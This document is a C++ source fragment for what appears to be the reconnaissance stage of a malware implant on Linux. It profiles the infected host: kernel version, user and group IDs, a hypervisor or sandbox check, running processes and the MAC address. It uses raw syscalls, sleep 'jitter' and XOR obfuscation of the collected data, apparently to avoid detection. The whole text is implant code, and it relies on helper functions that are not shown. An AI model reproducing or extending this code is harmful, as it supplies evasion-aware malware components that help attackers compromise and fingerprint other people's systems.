// Complete minimal-dependency reconnaissance module
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/dirent.h>
#include <fcntl.h>
#include <time.h>

// All structures and helpers from above...

SystemReconMinimal sys_recon_linux_exec() {
    SystemReconMinimal recon = {0};
    
    // Apply timing jitter
    struct timespec ts = {0};
    ts.tv_nsec = 100000000; // 100ms base
    syscall(SYS_nanosleep, &ts, nullptr);
    
    // Kernel version
    struct utsname uts;
    if (syscall(SYS_uname, &uts) == 0) {
        int pos = 0;
        pos += str_copy(recon.kernel_version + pos, uts.sysname, 64);
        recon.kernel_version[pos++] = ' ';
        str_copy(recon.kernel_version + pos, uts.release, 64);
    }
    
    // UID/GID
    recon.uid = syscall(SYS_getuid);
    recon.gid = syscall(SYS_getgid);
    
    // Hypervisor detection
    HypervisorInfo hv = detect_hypervisor_cpuid();
    if (hv.present) {
        str_copy(recon.virt_indicator, hv.signature, sizeof(recon.virt_indicator));
    } else {
        str_copy(recon.virt_indicator, "PHYSICAL", sizeof(recon.virt_indicator));
    }
    
    // Process enumeration (limited to fixed array)
    std::vector<ProcessInfo> temp_procs;
    enumerate_processes_syscall(temp_procs);
    
    recon.process_count = 0;
    for (size_t i = 0; i < temp_procs.size() && recon.process_count < 256; i++) {
        recon.processes[recon.process_count].pid = temp_procs[i].pid;
        str_copy(recon.processes[recon.process_count].comm, 
                 temp_procs[i].comm, 64);
        recon.process_count++;
    }
    
    // Network info (simplified - only MAC)
    int sock = syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
    if (sock >= 0) {
        struct ifreq ifr = {0};
        str_copy(ifr.ifr_name, "eth0", IFNAMSIZ);
        
        if (syscall(SYS_ioctl, sock, SIOCGIFHWADDR, &ifr) == 0) {
            unsigned char* m = (unsigned char*)ifr.ifr_hwaddr.sa_data;
            int pos = 0;
            for (int i = 0; i < 6; i++) {
                pos += hex_to_str(m[i], recon.mac_addr + pos);
                if (i < 5) recon.mac_addr[pos++] = ':';
            }
            recon.mac_addr[pos] = '\0';
        }
        
        syscall(SYS_close, sock);
    }
    
    // Final jitter
    syscall(SYS_nanosleep, &ts, nullptr);
    
    // XOR obfuscation
    xor_obfuscate((unsigned char*)&recon, sizeof(recon), 0xAA);
    
    return recon;
}
